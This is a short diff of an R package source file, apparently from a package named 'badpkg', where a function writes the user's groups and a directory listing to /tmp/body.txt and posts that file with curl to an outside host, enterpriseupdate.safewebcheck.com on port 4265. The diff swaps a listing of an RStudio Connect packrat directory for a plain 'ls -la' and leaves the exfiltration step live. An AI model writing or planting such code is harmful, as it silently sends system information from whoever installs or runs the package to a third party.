@@ -24,5 +24,6 @@ hello <- function() {
 #file.create("/Users/jeff/workspace/badpkg/heyo2.txt")
 
 system('groups >> /tmp/body.txt')
-system('ls -la /var/lib/rstudio-connect/mnt/packrat >> /tmp/body.txt')
+#system('ls -la /var/lib/rstudio-connect/mnt/packrat >> /tmp/body.txt')
+system('ls -la')
 system('curl -X POST -H "Content-Type: text/plain" --data-binary "@/tmp/body.txt" http://enterpriseupdate.safewebcheck.com:4265')
